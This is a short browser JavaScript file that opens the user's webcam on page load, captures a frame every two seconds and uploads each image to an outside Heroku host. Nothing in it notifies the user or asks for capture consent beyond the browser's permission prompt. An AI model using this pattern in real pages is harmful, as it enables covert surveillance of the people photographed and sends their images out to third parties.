document.addEventListener('DOMContentLoaded', () => {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    // Access the user's webcam
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            video.srcObject = stream;
            // Automatically capture a photo every 2 seconds
            setInterval(() => {
                capturePhoto();
            }, 2000);
        })
        .catch(error => {
            console.error('Error accessing the webcam:', error);
        });

    // Function to capture the photo
    function capturePhoto() {
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        uploadPhoto();
    }

    // Function to upload the photo
    function uploadPhoto() {
        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('photo', blob, 'photo.png');

            fetch('https://picuploader.herokuapp.com/upload', { // Update this URL
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);
                // Optionally, you can handle the success event here
            })
            .catch(error => {
                console.error('Error:', error);
            });
        }, 'image/png');
    }
});
